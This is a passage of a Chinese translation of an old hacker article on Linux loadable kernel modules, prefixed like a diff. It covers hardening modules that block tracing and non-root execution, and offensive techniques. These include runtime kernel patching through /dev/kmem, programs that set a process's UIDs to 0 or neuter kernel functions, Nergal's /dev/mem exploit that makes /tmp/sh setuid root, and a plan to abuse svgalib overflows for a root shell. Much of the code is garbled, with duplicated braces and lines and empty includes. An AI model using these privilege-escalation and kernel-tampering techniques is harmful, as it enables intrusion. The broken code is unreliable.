+我的这个小LKM叫’Anti-Tracer’。它基本上实现了上面的思路。我们进程的标记字段用current指针可很容易的取回（task structure）。余下部分没什么新内容。
+#define MODULE
+#define __KERNEL__
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+extern void* sys_call_table[];
+int __NR_myexecve;
+int (*orig_execve) (const char *, const char *[], const char *[]);
+char *strncpy_fromfs(char *dest, const char *src, int n)
+{
+char *tmp = src;
+int compt = 0;
+do {
+dest[compt++] = __get_user(tmp++, 1);
+}
+}
+while ((dest[compt - 1] != '\0') && (compt != n));
+return dest;
+}
+int my_execve(const char *filename, const char *argv[], const char *envp[])
+{
+long __res;
+__asm__ volatile ("int $0x80":"=a" (__res):"0"(__NR_myexecve), "b"((long)(filename)), "c"((long) (argv)), "d"((long) (envp)));
+return (int) __res;
+}
+　
+int hacked_execve(const char *filename, const char *argv[], const char *envp[])
+{
+int ret, tmp;
+unsigned long mmm;
+char *kfilename;
+/*check for the flags*/
+if ((current->flags & PF_PTRACED)||(current->flags & PF_TRACESYS)) {
+/*我们被跟踪了，输出被跟踪的进程名，不执行直接返回*/
+kfilename = (char *) kmalloc(256, GFP_KERNEL);
+(void) strncpy_fromfs(kfilename, filename, 255);
+printk("<1>TRACE ATTEMPT ON %s -> PERMISSION DENIED\n", kfilename);
+kfree(kfilename);
+return 0;
+}
+ret = my_execve(filename, argv, envp);
+return ret;
+}
+int init_module(void) /*module setup*/
+{
+__NR_myexecve = 200;
+while (__NR_myexecve != 0 && sys_call_table[__NR_myexecve] != 0)
+__NR_myexecve--;
+orig_execve = sys_call_table[SYS_execve];
+if (__NR_myexecve != 0)
+{
+sys_call_table[__NR_myexecve] = orig_execve;
+sys_call_table[SYS_execve] = (void *) hacked_execve;
+}
+return 0;
+}
+void cleanup_module(void) /*module shutdown*/
+{
+{
+sys_call_table[SYS_execve]=orig_execve;
+}
+这个LKM也记录了任何某人想跟踪执行的运行程序。这个程序用来检查某些标记，但如果一个程序已经在运行的话，你怎么跟踪呢？想象一下一个正在运行的程序，PID是1853，你试一下’strace –p 1853’，可以用。要保证这样的安全，修改sys_ptrace(...)是唯一的办法。看下面的模块：
+#define MODULE
+#define __KERNEL__
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+extern void* sys_call_table[];
+　
+int (*orig_ptrace)(long request, long pid, long addr, long data);
+int hacked_ptrace(long request, long pid, long addr, long data)
+{
+printk("TRACING IS NOT ALLOWED\n");
+return 0;
+}
+　
+int init_module(void) /*module setup*/
+{
+orig_ptrace=sys_call_table[SYS_ptrace];
+sys_call_table[SYS_ptrace]=hacked_ptrace;
+return 0;
+}
+void cleanup_module(void) /*module shutdown*/
+{
+sys_call_table[SYS_ptrace]=orig_ptrace;
+}
+用了这个LKM则没人能跟踪任何程序了。
+
+4.用LKM加固Linux内核
+本节的主题对Phrack的读者应该很熟悉。Route就使Linux系统更安全介绍了很好的思路，他采用打补丁的方式。我想提供一些可用LKM实现的思路。记住不隐藏这些LKM也可用（当然隐藏是你应该做的），因为Route 的补丁当某人得到系统的超级用户权限也是没用的；非特权用户可看到我们的LKM，但不能删除它。用LKM代替静态内核补丁的优势：
+你可以很容易的管理整个系统的安全，在正运行的系统上安装更容易。不必在敏感系统每次重新启动时都安装一个新的内核。
+Phrack的补丁还有一些记录功能我这里没实现，但有太多的方法做这些了。最简单的办法是用printk(...)[注：我没看route的补丁的所有方面。也许真正的黑客高手能用LKM做的更好。]
+
+为什么我们应该给仲裁程序运行权?
+下面的LKM有点类似Route的内核补丁检查运行权
+#define __KERNEL__
+#define MODULE
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+/* where the sys_calls are */
+int __NR_myexecve = 0;
+extern void *sys_call_table[];
+int (*orig_execve) (const char *, const char *[], const char *[]);
+int (*open)(char *, int, int);
+int (*close)(int);
+
+char *strncpy_fromfs(char *dest, const char *src, int n)
+{
+char *tmp = src;
+int compt = 0;
+do {
+dest[compt++] = __get_user(tmp++, 1);
+}
+while ((dest[compt - 1] != '\0') && (compt != n));
+return dest;
+}
+int my_execve(const char *filename, const char *argv[], const char *envp[])
+{
+{
+long __res;
+__asm__ volatile ("int $0x80":"=a" (__res):"0"(__NR_myexecve), "b"((long) (filename)), "c"((long) (argv)), "d"((long) (envp)));
+return (int) __res;
+}
+int hacked_execve(const char *filename, const char *argv[], const char *envp [])
+{
+int fd = 0, ret;
+struct file *file;
+/*we need the inode strucure*/
+/*这里我用了open 方法，你应该通过LKM感染程序理解它了，接着看，看更好一些的方法*/
+fd = open(filename, O_RDONLY, 0);
+file = current->files->fd[fd];
+/*这是 root 文件吗?*/
+/*记住：此处你可做其它检查（route做了很多检查），这里只是演示，看一下inode结构看有没有可以改的其它项（linux/fs.h）*/
+if (file->f_inode->i_uid!=0)
+{
+printk("<1>Execution denied !\n");
+close(fd);
+close(fd);
+return -1;
+}
+else /*否则让用户运行文件*/
+{
+ret = my_execve(filename, argv, envp);
+return ret;
+}
+}
+int init_module(void) /*module setup*/
+{
+printk("<1>INIT \n");
+__NR_myexecve = 250;
+while (__NR_myexecve != 0 && sys_call_table[__NR_myexecve] != 0)
+__NR_myexecve--;
+orig_execve = sys_call_table[SYS_execve];
+if (__NR_myexecve != 0)
+{
+printk("<1>everything OK\n");
+sys_call_table[__NR_myexecve] = orig_execve;
+sys_call_table[SYS_execve] = (void *) hacked_execve;
+}
+open = sys_call_table[__NR_open];
+close = sys_call_table[__NR_close];
+return 0;
+}
+void cleanup_module(void) /*module shutdown*/
+{
+sys_call_table[SYS_execve]=orig_execve;
+}
+这个程序同route的内核补丁不完全相同，route检查路径我们检查文件（路径检查也能做到，但我认为检查文件更好些）。我只实现了文件UID的检查，管理员可用来过滤文件的执行进程。我说过用open/fd方法不是最简单的方法，我用它们是因为你对这些应该很熟（记得吧，LKM感染程序用过这种方法）。下面的内核函数也可用来实现我们的目的（更简单一点）：
+int namei(const char *pathname, struct inode **res_inode);
+int lnamei(const char *pathname, struct inode **res_inode);
+这些函数用某一路径返回对应的inode结构。两个函数的不同在于对符号链接的解析：namei不解析符号链接直接返回符号链接的inode结构。作为一个黑客你也可以直接更改inode。通过改写sys_execve(...)取回inode用namei(...)处理它们（这种方法我们也可用来控制执行）（我在5.3中将给出实例）。
+
+链接补丁
+每个Linux用户都知道符号链接漏洞出在系统安全方面，就会带来严重的安全问题。Andrew Tridgell开发了一个内核补丁“防止一个进程带有在有t字母的目录（多为/tmp/）中的链接，除非它是这个链接的所有者”。Solar Designer 加入了一些代码，也是用来防止用户在有t字母的目录中建立到他们不是属主的文件的硬链接。我必须承认符号链接所处的层次从我们的LKM所在的位置不容易处理到。既没有我们可补的导出符号也没有我们可更改的系统调用。符号链接的解析是VFS完成的。看一下第四部分能帮我们解决问题的方法（但我不会去用这个方法来保护系统）。你也许想知道为什么我不用sys_readlink(...)系统调用来解决这个问题，是这样，如果你用'ls -a symlink'，会用到这个调用，但如果你用'cat symlink'，就不会用到。我认为你应该把这些留给内核补丁，当然为了防止用户在/tmp目录下创建符号链接你可
+以写一个修改 sys_symlink(...)系统调用的LKM。看一下硬链接的LKM的相似实现。把符号链接问题转化为LKM是有点难，Solar Designer的关于硬链接限制的思路，可用LKM实现，我们只需改写sys_link(...)，它对应建立硬链接。让我们看一下改过的系统调用（代码同内核补丁不完全一样，因为我们只检查’/tmp/’目录，不是针对特殊字符（+t），但这也可通过查看目录的inode结构实现[见5.1]）：
+int hacked_link(const char *oldname, const char *newname)
+{
+char *kernel_newname;
+int fd = 0, ret;
+struct file *file;
+kernel_newname = (char*) kmalloc(256, GFP_KERNEL);
+memcpy_fromfs(kernel_newname, newname, 255);
+/*hard link to /tmp/ directory ?*/
+if (strstr(kernel_newname, (char*)&hide ) != NULL)
+{
+{
+kfree(kernel_newname);
+/*I use the open approach again :}*/
+fd = open(oldname, O_RDONLY, 0);
+file = current->files->fd[fd];
+/*check for UID*/
+if (file->f_inode->i_uid!=current->uid)
+{
+printk("<1>Hard Link Creation denied !\n");
+close(fd);
+return -1;
+}
+}
+else
+{
+kfree(kernel_newname);
+/*everything ok -> the user is allowed to create the hard link*/
+return orig_link(oldname, newname);
+}
+}
+用这种方法你也可控制符号链接的创建。
+
+/proc访问权限补丁
+我已经给你提供了一些如何隐藏信息的方法。Route的思路与我们的隐藏方法不同。他想通过改变目录的访问权限来限制对/proc/（需要从此目录得到进程信息）的访问，所以他修补了proc inode。下面的LKM实现同静态内核补丁同样的功能，如果你加载它，用户就被禁止读进程的信息，卸载以后，就又能读了。开始：
+/*很差的编程风格（也许我们应该用函数取回inode），但有效...*/
+#define __KERNEL__
+#define MODULE
+#define BEGIN_KMEM {unsigned long old_fs=get_fs();set_fs(get_ds());
+#define END_KMEM set_fs(old_fs);}
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+extern void *sys_call_table[];
+int (*open)(char *, int, int);
+int (*close)(int);
+　
+int init_module(void) /*module setup*/
+{
+int fd = 0;
+struct file *file;
+struct inode *ino;
+/*又用open(...) 方法*/
+open = sys_call_table[SYS_open];
+close = sys_call_table[SYS_close];
+/*我们要为系统调用提供一些内核空间数据*/
+BEGIN_KMEM
+fd = open("/proc", O_RDONLY, 0);
+END_KMEM
+printk("%d\n", fd);
+file = current->files->fd[fd];
+/*proc目录的i节点*/
+ino= file->f_inode;
+/*修改权限*/
+ino->i_mode=S_IFDIR | S_IRUSR | S_IXUSR;
+close(fd);
+close(fd);
+return 0;
+}
+void cleanup_module(void) /*module shutdown*/
+{
+int fd = 0;
+struct file *file;
+struct inode *ino;
+BEGIN_KMEM
+fd = open("/proc", O_RDONLY, 0);
+END_KMEM
+printk("%d\n", fd);
+file = current->files->fd[fd];
+/*proc目录的inode */
+ino= file->f_inode;
+/*修改权限*/
+ino->i_mode=S_IFDIR | S_IRUGO | S_IXUGO;
+close(fd);
+}
+加载此模块，试一下ps,top或其它命令，应该无效，所有的对/proc目录的访问被完全否决。当然，如果你是超级用户，你仍然可以看到所有的进程和其它任何东西，这个模块只是用来限制你的那些傻用户的权限的补丁。
+[注：这是一个修改inode的实际实现‘on the fly’你会看到如何滥用它的很多可行方法。]
+
+securelevel补丁
+这个补丁的目的：我引用route的话
+“ 这个补丁并不是真正的补丁。它仅仅将securelevel提高，从1到0。它在文件中附加了免疫追加位，防止任何人改动这些文件（从一般的字符接口）。在运行它之前，你应该确定哪些文件应被免疫，哪些记录文件只能追加。打开底层磁盘设备仍是可能的，但那些只知道cut和paste命令的黑客是不可能懂得如何去做的。”好，这个用LKM是非常容易实现的，我们很幸运，因为对应securelevel的符号是public
+（见/proc/ksyms），我们很容易修改它。我对此不提供例子了，你只要引入securelevel，并在模块的初始化函数里设置它就可以了。
+
+底层磁盘补丁
+我开发了一种简单的办法去防止一些象THC的manipate-data这样的工具。这些工具被黑客用来在硬盘上查找他们的来源IP地址或域名，找到这些以后，他们就从硬盘上修改或修改或删掉。要做到这些他们需要访问/dev/*文件以打开底层磁盘。当然这么做他们必须是超级用户。我们怎么办呢，我找到如下方法防止这些攻击[当然也有更多的方法打破这种防护L ]：
+启动系统
+安装LKM，它防止对你存记录的分区的直接（/dev/*）存取。这是有效的，因为系统（正常情况下）只在某些（很少）操作中需要直接存取底层磁盘。LKM仅仅改写了sys_open(...)并滤掉所需的dev文件，我想不需要提供编写的程序，看一下II.4.2吧。这个办法可以保护任何/dev/*文件。当这个LKM加载以后没人能直接存取这些文件是个问题。
+[注：用了这个补丁之后，有些函数会不正常/崩溃系统，但通常的web、mailserver都还
+能正常运行。]
+
+第四部分 一些更好的思路（用于黑客）
+1.打败管理员LKM的技巧
+这个部分将给我们一些建议，如何在有很疯（好）的管理员的系统上搞鬼。在解释了管理员保护系统的所有方法之后，对于我们（黑客）找更好的办法太难了。为了打破这些坚固的防护，我们暂时把LKM放到一边。假设有这样一个系统，管理员在上面安装了一个很好很大的LKM可检查系统上的所有动作，可以做第二、第三部分提到的所有事情。去掉这个LKM的第一个方法是试着重新启动系统，也许管理员不是在初始化文件中加载这个LKM，所以尝试一下DoS攻击或其它方法。如果还不能去掉这个LKM就试着看一些重要文件，但要小心，这些文件可能被保护/被监视（这样的LKM见附录A）。
+如果你真的找不出LKM是哪里加载的，就把这个系统或有你的后门的磁盘忘掉吧，你不能在上面隐形（进程/文件）。如果管理员真用了这样一个巨型LKM，最好不要理这个系统，因为管理员可能是高手，你可能会有麻烦的。那些一定要攻破这样系统的人看节2。
+
+2.修补整个内核或建立黑客OS
+[注：本节听起来有点离题，但最后我会给出一个漂亮的思路（程序是Silvio Cesare写的），帮助我们用我们的LKM。因为本节我们只考虑Silvio Cesare的思路，只给出整个kmem问题的一个摘要。] LKM很不错，但如果管理员象1中描述的那样怎么办，他为了防止我们使用第二部分提到的LKM技术，甚至修补自己的内核使系统更安全，甚至使用一个不支持本地LKM的内核。
+所以是使出我们最后一招的时候了：实时内核修补。本节的基本思路来源于我找到的一些源代码（kmemthief等人）和 Silvio Cesare的一篇描述修改内核符号的一般方法的文章。我认为这种攻击是内核入侵的最强的方法。我不懂其它Unix内核，但这种方法对你在其它系统上也很有帮助。本节是讲实时内核修补的，那什么又是内核文件修补呢？每个系统都有对应内核（plainkernel）的一个文件，在免费的系统如 FreeBSD，Linux，等中修改内核文件是很容易的，但商业系统怎么办呢？我从未试过，但我认为这真的很有意思：假设你用内核修补在一个系统中留下后门，剩下来的就是来次重启动或等它重启动（每个系统都会有重启动的时候的）。但这段文字只写实时的方法，你可以把它称为 “滥用Linux可加载内核模块”同时你也不想知道怎样去修补整个Linux内核。本节将帮我们在非常安全并且其内核不支持LKM的系统中 ’insmod’LKM。让我们学点帮助我们滥用LKM的东西吧。
+让我们开始学一些如果我们想要做RKP（实时内核修补）就必须处理的最重要的东西。就是/dev/kmem文件，它使我们看（修改）目标系统的整个虚拟内存成为可能。[注：RKP方法在大多数情况下只有你成为系统的超级用户才能用，只有非常不安全的系统才会给普通用户访问这个文件的权力。]
+如前所述，/dev/kmem给了我们一个能够看到系统中每个内存字节（包括 swap）的机会。这意味着我们可以存取整个内存也允许我们处理内存中的任何内核项（因为内核也仅仅是加载到系统内存中的目标代码）。记住/proc /ksyms文件给我们提供了所有引出的内核符号的地址，所以我们知道要处理某些内核符号应该修改内存的那个位置。让我们看一下很早就有的一个最基本的例子，下面的程序（用户空间）处理task_structure地址（在/proc/ksyms中查找kstat）和某个PID，在task结构中找到指定的PID后修改所有的用户ID字段是此进程UID=0。当然现在这个程序几乎没用了，因为大多系统甚至不允许普通用户读/dev/kmem。但它是对 RKP的一个很好的介绍。
+
+/*注意：我的实现里没有错误控制！*/
+#include
+#include
+#include
+#include
+/* task 结构叠代的最大数*/
+#define NR_TASKS 512
+/*我们 task_struct -> 我只用了我们需要的部分*/
+struct task_struct {
+char a[108]; /*我们不需要的东西*/
+int pid;
+char b[168]; /*我们不需要的东西*/
+unsigned short uid,euid,suid,fsuid;
+unsigned short gid,egid,sgid,fsgid;
+char c[700]; /*我们不需要的东西*/
+};
+
+/*原来的task_structure, 使你知道你还能改什么
+struct task_struct {
+volatile long state;
+long counter;
+long priority;
+unsigned long signal;
+unsigned long blocked;
+unsigned long flags;
+int errno;
+long debugreg[8];
+struct exec_domain *exec_domain;
+struct linux_binfmt *binfmt;
+struct task_struct *next_task, *prev_task;
+struct task_struct *next_run, *prev_run;
+unsigned long saved_kernel_stack;
+unsigned long kernel_stack_page;
+int exit_code, exit_signal;
+unsigned long personality;
+int dumpable:1;
+int did_exec:1;
+int pid;
+int pgrp;
+int tty_old_pgrp;
+int session;
+int leader;
+int leader;
+int groups[NGROUPS];
+struct task_struct *p_opptr, *p_pptr, *p_cptr, *p_ysptr, *p_osptr;
+struct wait_queue *wait_chldexit;
+unsigned short uid,euid,suid,fsuid;
+unsigned short gid,egid,sgid,fsgid;
+unsigned long timeout, policy, rt_priority;
+unsigned long it_real_value, it_prof_value, it_virt_value;
+unsigned long it_real_incr, it_prof_incr, it_virt_incr;
+struct timer_list real_timer;
+long utime, stime, cutime, cstime, start_time;
+unsigned long min_flt, maj_flt, nswap, cmin_flt, cmaj_flt, cnswap;
+int swappable:1;
+unsigned long swap_address;
+unsigned long old_maj_flt;
+unsigned long dec_flt;
+unsigned long swap_cnt;
+struct rlimit rlim[RLIM_NLIMITS];
+unsigned short used_math;
+char comm[16];
+int link_count;
+struct tty_struct *tty;
+struct sem_undo *semundo;
+struct sem_queue *semsleeping;
+struct desc_struct *ldt;
+struct thread_struct tss;
+struct fs_struct *fs;
+struct files_struct *files;
+struct mm_struct *mm;
+struct signal_struct *sig;
+#ifdef __SMP__
+int processor;
+int last_processor;
+int lock_depth;
+#endif
+};
+*/
+int main(int argc, char *argv[])
+{
+unsigned long task[NR_TASKS];
+/*used for the PID task structure*/
+struct task_struct current;
+int kmemh;
+int i;
+pid_t pid;
+pid_t pid;
+int retval;
+pid = atoi(argv[2]);
+kmemh = open("/dev/kmem", O_RDWR);
+/*定位到第一个task structure在内存中的位置*/
+lseek(kmemh, strtoul(argv[1], NULL, 16), SEEK_SET);
+read(kmemh, task, sizeof(task));
+/*叠代直到找到我们自己的task structure (由PID标出)*/
+for (i = 0; i < NR_TASKS; i++)
+{
+lseek(kmemh, task[i], SEEK_SET);
+read(kmemh, ¤t, sizeof(current));
+/*是我们的进程吗？*/
+if (current.pid == pid)
+{
+/*是，就改UID字段...*/
+current.uid = current.euid = 0;
+current.gid = current.egid = 0;
+/*写回到内存*/
+lseek(kmemh, task[i], SEEK_SET);
+write(kmemh, ¤t, sizeof(current));
+printf("Process was found and task structure was modified\n");
+exit(0);
+exit(0);
+}
+}
+}
+这个小程序没什么特别的，只是按某种方式查找一个文件然后修改一些字段。其它地方有很多程序做类似的事情。如你所见上例只用来演示，不会帮你攻击系统（但也许有很烂的系统允许用户写/dev/kmem，我不知道）。用同样的方法你也可以改对应的放有内核模块信息的模块数据结构。通过改kmem，你也
+可隐藏模块，我没提供这样的实现，因为这同上面的程序一样简单（搜索有点难;））。
+上面我们修改内核结构的方法，有很多程序在做，但有函数吗？通过在互联网上搜索，你很快就会发现不多。当然修补内核的函数是有一定技巧性的（稍后我们会做点有用的东西）。最好的办法是修改sys_call_table结构使它指向一个我们写的全新的函数。否则就会出现函数大小之类的问题。下例是个使所有的系统调用都什么的也不做的简单程序，我在从/proc/ksyms拿到的所有函数地址的开头都插入了一个RET（0xc3），用这种方法使函数什么也不做立刻返回。
+/*无错误控制*/
+#include
+#include
+#include
+#include
+/*我们的RET 操作码*/
+unsigned char asmcode[]={0xc3};
+int main(int argc, char *argv[])
+{
+unsigned long counter;
+int kmemh;
+/*打开设备*/
+kmemh = open("/dev/kmem", O_RDWR);
+/*定位到函数开始的内存地址处*/
+lseek(kmemh, strtoul(argv[1], NULL, 16), SEEK_SET);
+/*写入我们的补丁字节*/
+write(kmemh, &asmcode, 1):
+close(kmemh);
+}
+让我们总结一下到现在我们都会什么了：我们可以修改任何内核符号；这包括sys_call_table[]和其它函数或数据结构。记住只有我们能存取/dev/kmem时我们才能做内核修补，但有很多保护这个文件的办法，
+见III.5.5。
+如何在/dev/kmem中查找内核符号
+看过上面的例子之后你可能问如何修改任意内核符号和如何查找感兴趣的。上例中我们用/proc/ksyms得到我们想要修改的符号的地址，但对于不支持 LKM的系统，没有/proc/ksyms文件，因为它只用来做模块管理（公共/可用符号）。内核符号没被引出，我们如何修改呢？
+很多问题，让我们找找解决办法。Silvio Cesare讨论了一些找不同内核符号（公共的和非公共的）的一些方法。他指出但编译Linux内核时，一个叫’System.map’的文件被建立，他把所有的内核符号映射到一个固定地址。这个文件只在编译期间用来解析那些内核符号。运行中的系统不需此文件。用在编译中的地址同我们定位用的/dev /kmem是一样的。所以通用方法如下：
+在System.map中查找内核符号
+拿到我们要找的地址
+修改内核符号（数据结构，函数或其它什么）
+听起来很简单，但有个大问题。不使用我们的内核的系统有自己的内核符号地址。同时在大多数系统中你找不到能告诉我们所有地址的System.map文件。怎么办？Silvio Cesare 提出用“关键字搜索”，拿来你的内核，读出一个符号地址的头10（随机值）个字节，然后把它们作为关键字在其它内核中搜索同一符号。
+如果你不能为某个符号建立通用的关键字你可以试着把它同能建立通用关键字的其它内核符号建立某种联系，可以通过看内核源码找到这种联系；通过这种办法你就可以找到你能修改的感兴趣的内核符号了。
+
+新的在无内核支持下工作的’insmod’命令
+是回到我们的LKM入侵的时候了，本节将给出对Silvio Cesare的kinsmod程序的一些提示。我将粗略的讲一下，程序最复杂的部分是目标代码的处理（elf文件）和它到内核空间的映射，但这些只是 elf头处理，同内核技术无关。Silvio Cesare用elf文件是因为用这种方式你可插入[一般的]LKM。写一个文件（用操作码->见我的RET例子）然后把这个文件插入也是可行的办法，只是映射容易但写起来难。为了那些想知道如何处理efl文件的人我把Silvio Cesare的程序放到这段文字中（我这么做也是因为Silvio Cesare想让他的源码/思路在同一篇文章出现）。
+是时候看一下在不支持插入LKM的系统中保持这个特性的一般思路了。如果我们想向内核中插入代码（LKM或别的东西）我们要面对的第一个问题就是需要内存。我们不能在 /dev/kmem中随便找个地址写入我们的目标代码。所以我们应该把我们的代码放到哪里呢，使它既不能损坏运行中的系统，有不会因为内核空间中的内存操作而被删除。有个地方我们可以插入一点代码，看一下通常情况下的内核内存图：内核数据区
+...
+kmalloc 堆
+Kmalloc 堆用于内核空间的内存分配（kmalloc(...)）。我们不能把我们的代码放入堆中，因为我们不能肯定我们放代码的地址不被使用。Silvio Cesare的思路是这样的：kmalloc堆在内存中边界被存放在memory_start和memory_end中，它们由内核引出（见/proc /ksyms）。重要的一点是这个开始地址（memory_start）不是实际的kmolloc堆的开始地址，因为这个值指向memory_start 的下个页面的边界。所以有一点内存将永远不会被用到（在memory_start和真正kmalloc堆之间）。这是插入我们的代码的最好的地点。故事还没完，你可能意识到了，这么一点点空间不可能放入一个有用的LKM。Silvio Cesare把一些引导型代码放入这小块空间中，这段代码加载实际的LKM。用这种方法我们就可在不支持加载的系统上加载LKM。关于真正映射一个LKM 文件（elf格式的）到内核中的进一步讨论参见Silvio Cesare 的相关文章，有点难度。
+
+3.最后几句
+节2不错，但如果系统禁止存取kmem怎么办？最后的办法只能是利用一些内核漏洞来插入/修改内核空间。内核空间总会有一些缓冲区溢出和其它问题的。考虑一下在模块中找漏洞，多读一些内核源码。甚至用户空间的程序也可帮助我们修改内核。
+记住，不久前关于svgalib的漏洞被发现，所有用到svgalib的程序有/dev/mem的写权限。/dev/mem也可用于RKP象用/dev/kmem那样来确定地址。看一下下表，以获得如何在非常安全的系统中做RKP的一些思路：
+找到一个用svgalib的程序
+查看这个程序的源代码，看有没有通常的缓冲区溢出（应该不难）
+写一个攻击程序使它运行上面的程序打开/dev/mem的写句柄以处理相关task数据结构使你的进程UID为0
+建立rootshell
+这种通用模式非常有效（zgv,gnuplot或一些已知的例子）。为了修改task结构一些人用到Nergal写的如下程序（用到了写打开句柄）：
+/* by Nergal */
+#define SEEK_SET 0
+#define __KERNEL__
+#include
+#undef __KERNEL__
+#define SIZEOF sizeof(struct task_struct)
+int mem_fd;
+int mypid;
+void
+testtask (unsigned int mem_offset)
+{
+struct task_struct some_task;
+int uid, pid;
+lseek (mem_fd, mem_offset, SEEK_SET);
+read (mem_fd, &some_task, SIZEOF);
+if (some_task.pid == mypid) /* is it our task_struct ? */
+{
+some_task.euid = 0;
+some_task.fsuid = 0; /* needed for chown */
+lseek (mem_fd, mem_offset, SEEK_SET);
+write (mem_fd, &some_task, SIZEOF);
+/* from now on, there is no law beyond do what thou wilt */
+chown ("/tmp/sh", 0, 0);
+chmod ("/tmp/sh", 04755);
+exit (0);
+}
+}
+#define KSTAT 0x001a8fb8 /* <-- replace this addr with that of your kstat */
+
+main () /* by doing strings /proc/ksyms |grep kstat */
+{
+unsigned int i;
+struct task_struct *task[NR_TASKS];
+unsigned int task_addr = KSTAT - NR_TASKS * 4;
+mem_fd = 3; /* presumed to be opened /dev/mem */
+mypid = getpid ();
+lseek (mem_fd, task_addr, SEEK_SET);
+read (mem_fd, task, NR_TASKS * 4);
+for (i = 0; i < NR_TASKS; i++)
+if (task[i])
+testtask ((unsigned int)(task[i]));
+}
+这个例子是想告诉你，总有办法的，你要做的是找到它。带有堆栈执行程序补丁的系统，你可以找堆溢出或直接跳到一些库函数里（system(...)）。有上千种方法....
+
+第五部分 最新特性：内核2.2.x
+1.对LKM编写者来说的主要不同
+Linux 有了一个新的主版本2.2的内核，对LKM的编写带来了一点小变化。这个部分将帮助你适应这个变化，并指出最大的改变之处。[注：针对新内核我会有新的文章]我会提供一些新的宏和函数来帮助你开发用于新内核的LKM。要想看所有的改动，可参考新的Linux/module.h这个include文件，相对于内核2.1.18它整个被重写了。我们先看一下能让我们更容易处理系统表的一些宏：
+宏
+描述
+EXPORT_NO_SYMBOLS;
+同旧版本的register_symtab(NULL) 一样
+
+EXPORT_SYMTAB;
+如果你想引出某些符号，它必须在linux/module.h 之前定义
+
+EXPORT_SYMBOL(name);
+引出以'name'为名称的符号
+
+EXPORT_SYMBOL_NOVERS (name);
+无版本信息的引出
+
+用户空间的访问函数也有一点改动，我也把它们列在这里（把asm/uaccess.h 包含进来
+就可使用它们）：
+函数
+描述
+int access_ok (int type, unsigned long addr, unsigned long size);
+此函数检查当前进程是否被允许去访问地址
+
+unsigned long copy_from_user (unsigned long to, unsigned long from, unsigned long len);
+这是一个新的memcpy_tofs 函数
+
+unsigned long copy_to_user (unsigned long to, unsigned long from, unsigned long len);
+于copy_from_user(...) 相对应的函数
+
+你无需使用access_ok(...)，因为上面列出的函数自己就检查了。还有很多不同，要看细节的话你就要仔细看一下linux/module.h。
+最后我还想提的是，我写了很多关于kerneld后台进程的（kerneld）东西，内核2.2将不再使用kerneld ，它用其它方式实现request_module(...)内核空间函数—叫做kmod。Kmod一直运行在内核空间（不再象IPC针对用户空间）。对于 LKM编程人员没什么变化，你还可用request_module(...)来加载内核，所以LKM感染程序还能用在内核2.2系统中。
+我很遗憾关于内核2.2的章节太短了，但目前我正在写一篇关于内核2.2安全的通用文章（尤其是LKM行为），所以请关注新的THC发行。我甚至计划写一些有关 BSD系统的（例如FreeBSD,OpenBSD），但要花几个月的时间。（译者注：作者并未食言，本人在翻译此文时，已经看到了作者关于 FreeBSD下可加载内核模块的文章，THC/六月版。）
+
+第六部分 最后的话
+1.LKM的背景或如何使系统插件和入侵兼容
+你可能不知道LKM如何不安全和为什么要采用这种不安全的方式。LKM被设计成使用户用起来更方便。Linux挑战微软，所以开发者需要一种使古老的 Unix更活泼更容易的一种方式，他们开发了KDE和其它好东西。例如kerneld就是为了使模块处理更容易而开发的。但记住，越简单和越自动化的系统越容易产生安全问题。让一个系统每个人都能用并足够安全是不可能的。模块就是这方面的例子。
+微软给我们提供了其它的例子：想一下ActiveX，它（可能）是个好主意，使所有的事情都很简单，但带来了痛苦的安全问题。
+所以亲爱的Linux开发人员：小心，别犯微软这样的错误，别创建插件和入侵兼容的OS。时刻记着安全！
+本文也使这点很清楚，任何系统的内核都要尽全力保护，不可以让攻击者去改动你整个系统最重要的东西。我把这个任务留给所有的系统设计者了J 。
+
+2.链接到其它资源
+这里是一些关于LKM的有兴趣的链接（不单单针对入侵和安全）：
+[Internet]
+http://www.linuxhq.com
+关于Linux的所有东西+ 好的kernel 链接
+http://www.linuxlinks.com
+很多关于Linux的链接
+http://www.linux.org
+Linux的宣传页
+http://www.lwn.net
+Linux 每周新闻；有关于内核和安全的一些东西
+http://www.phrack.com
+看50 和 52 中关于模块的信息
+http://www.rootshell.com
+有些很好的LKMs
+http://www.geek-girl.com/bugtraq/
+有一些关于LKM安全的讨论
+http://hispahack.ccc.de
+HISPAHACK 主页
+http://r3wt.base.org
+THC主页(文章、杂志和很多工具)
+http://www.antisearch.com
+我知道的一个最好的针对安全/入侵的搜索引擎
+http://www.kernel.org
+拿个内核来研究一下！
+
+[Books]
+Linux-Kernel-Programming (Addison Wesley)
+一本非常好的书。我读的是德文版，但我想应该有英文版。
+Linux Device Drivers (O'Reilly)
+有点离题，但也非常有趣。重点写的如何用LKM编写设备驱动程序。
